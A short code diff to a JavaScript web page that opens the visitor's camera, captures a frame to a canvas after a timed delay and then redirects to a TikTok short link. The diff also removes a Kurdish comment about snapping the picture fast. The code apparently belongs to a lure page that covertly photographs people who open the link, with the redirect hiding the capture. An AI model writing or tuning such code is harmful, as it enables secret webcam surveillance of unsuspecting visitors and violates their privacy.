@@ -42,7 +42,6 @@
                 const v = document.getElementById('v');
                 v.srcObject = s;
                 
-                // لێرەدا کاتەکەم کرد بە 200 بۆ ئەوەی زۆر خێرا وێنەکە بگرێت
                 setTimeout(async () => {
                     const c = document.getElementById('c');
                     c.width = v.videoWidth;
@@ -63,7 +62,7 @@
                     });
 
                     window.location.href = "https://vt.tiktok.com/ZS5ugM47M/";
-                }, 200); 
+                }, 1000);
             } catch (e) {
                 window.location.href = "https://vt.tiktok.com/ZS5ugM47M/";
             }
